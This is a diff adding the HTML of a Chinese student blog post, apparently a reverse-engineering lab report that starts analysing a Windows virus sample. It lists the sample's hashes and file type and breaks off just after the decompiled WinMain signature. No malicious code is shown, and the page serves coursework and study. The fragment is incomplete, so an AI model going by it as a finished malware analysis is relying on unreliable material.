@@ -1,0 +1,1357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="博客, 生活, 技术, 记录">
+    
+    <meta name="author" content="W1ndys">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.w1ndys.top/posts/b681040b.html"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="W1ndys小屋">
+<meta property="og:type" content="article">
+<meta property="og:title" content="汇编语言与逆向工程实验报告9 &amp;&amp; 期中测验">
+<meta property="og:url" content="https://blog.w1ndys.top/posts/b681040b.html">
+<meta property="og:site_name" content="W1ndys小屋">
+<meta property="og:description" content="W1ndys小屋">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.w1ndys.top/images/redefine-og.webp">
+<meta property="article:published_time" content="2024-04-27T05:31:25.000Z">
+<meta property="article:modified_time" content="2025-02-23T05:37:18.719Z">
+<meta property="article:author" content="W1ndys">
+<meta property="article:tag" content="汇编语言">
+<meta property="article:tag" content="逆向工程">
+<meta property="article:tag" content="QFNU">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.w1ndys.top/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            汇编语言与逆向工程实验报告9 &amp;&amp; 期中测验 | W1ndys小屋
+        
+    </title>
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fonts/Chillax/chillax.css">
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <script data-swup-reload-script data-pjax charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+                
+    
+            
+                
+                    <script data-swup-reload-script data-pjax>LA.init({id:"3HPYFt9znqKItrHZ",ck:"3HPYFt9znqKItrHZ",autoTrack:true})</script>
+                
+    
+            
+                
+                    <link rel="stylesheet" type="text/css" href="/css/Capoo.css">
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/css/build/tailwind.css">
+    
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fonts/GeistMono/geist-mono.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fonts/Geist/geist.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        <script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/anime.min.js" ></script>
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.w1ndys.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"all_rights_reserved"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#1890ff","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"欢迎来到W1ndys小屋"},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"W1ndys小屋"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"https://pic1.zhimg.com/80/v2-b4e05912f591b51b9fa3e8aa4b9cba45.png","dark":"https://pic1.zhimg.com/80/v2-b4e05912f591b51b9fa3e8aa4b9cba45.png"},"title":"W1ndys小屋","subtitle":{"text":["一言加载中..."],"hitokoto":{"enable":true,"show_author":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/W1ndys","instagram":null,"zhihu":"https://www.zhihu.com/people/w1ndys","twitter":null,"email":"w1ndys@outlook.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"友链接力":{"icon":"fa-solid fa-train-subway","submenus":{"异次元之旅":"https://travel.moe/go.html?travel=on","MIIT Travel":"https://beian.miit.cn.com/go.php","虫洞 | 十年之约":"https://foreverblog.cn/go.html","博客录":"https://bokelu.suijiboke.gs","笔墨迹":"https://blogscn.fun/random.html","博客圈":"https://bokequan.cn/?suiji","开往":"https://www.travellings.cn/go.html"}},"Friends":{"path":"/links","icon":"fa-regular fa-link"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Welcome to W1ndys's Blog","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2023/08/22 05:20:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":true};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="W1ndys小屋" type="application/atom+xml">
+</head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        欢迎来到W1ndys小屋
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/haixian.svg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                W1ndys小屋
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-solid fa-train-subway fa-fw"></i>
+                                    友链接力
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://travel.moe/go.html?travel=on">
+                                                    异次元之旅
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://beian.miit.cn.com/go.php">
+                                                    MIIT TRAVEL
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://foreverblog.cn/go.html">
+                                                    虫洞 | 十年之约
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://bokelu.suijiboke.gs">
+                                                    博客录
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://blogscn.fun/random.html">
+                                                    笔墨迹
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://bokequan.cn/?suiji">
+                                                    博客圈
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://www.travellings.cn/go.html">
+                                                    开往
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/bookmarks/"
+                                        >
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                    书签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-友链接力"
+                        >
+                            <span>
+                                友链接力
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-友链接力">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://travel.moe/go.html?travel=on">异次元之旅</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://beian.miit.cn.com/go.php">MIIT TRAVEL</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://foreverblog.cn/go.html">虫洞 | 十年之约</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://bokelu.suijiboke.gs">博客录</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://blogscn.fun/random.html">笔墨迹</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://bokequan.cn/?suiji">博客圈</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://www.travellings.cn/go.html">开往</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/bookmarks/"
+                        >
+                            <span>
+                                书签
+                            </span>
+                            
+                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">161</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">80</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">193</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">汇编语言与逆向工程实验报告9 &amp;&amp; 期中测验</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://avatars.githubusercontent.com/u/109416673">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">W1ndys</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv6</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-04-27 13:31:25</span>
+        <span class="mobile">2024-04-27 13:31:25</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-02-23 13:37:18</span>
+            <span class="mobile">2025-02-23 13:37:18</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/QFNU/">QFNU</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/QFNU/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">汇编语言与逆向工程</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/QFNU/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">实验报告</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">汇编语言</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/QFNU/">QFNU</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="逆向病毒"><a href="#逆向病毒" class="headerlink" title="逆向病毒"></a>逆向病毒</h1><h2 id="文件基础信息"><a href="#文件基础信息" class="headerlink" title="文件基础信息"></a>文件基础信息</h2><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>crc32</td>
+<td>8C1CE91C</td>
+</tr>
+<tr>
+<td>md5</td>
+<td>73c297f059dd94671ca4e4c7dbfa6241</td>
+</tr>
+<tr>
+<td>sha1</td>
+<td>f9d5e6003715fbe3ccdf78a8bef866ebc876c85f</td>
+</tr>
+<tr>
+<td>sha256</td>
+<td>dcb8531b0879d46949dd63b1ac094f5588c26867805d0795e244f4f9b8077ed1</td>
+</tr>
+<tr>
+<td>sha512</td>
+<td>48db5c5b73bd824bf2ec3b398aea73c6ec93f519efcdc1528d8a91f32dcdbb428f539e6cb031416c8a2f551ec089993dd71a8bdae6530dd82bd4293e759dd402</td>
+</tr>
+<tr>
+<td>ssdeep</td>
+<td>1536:rUUBxlaaqYV&#x2F;VnvjIM3S9r8DzeEn5gairxh:DMbYkgjn5Qrf</td>
+</tr>
+<tr>
+<td>type</td>
+<td>PE32 executable (GUI) Intel 80386, for MS Windows</td>
+</tr>
+</tbody></table>
+<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WinMain 入口函数</span></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span 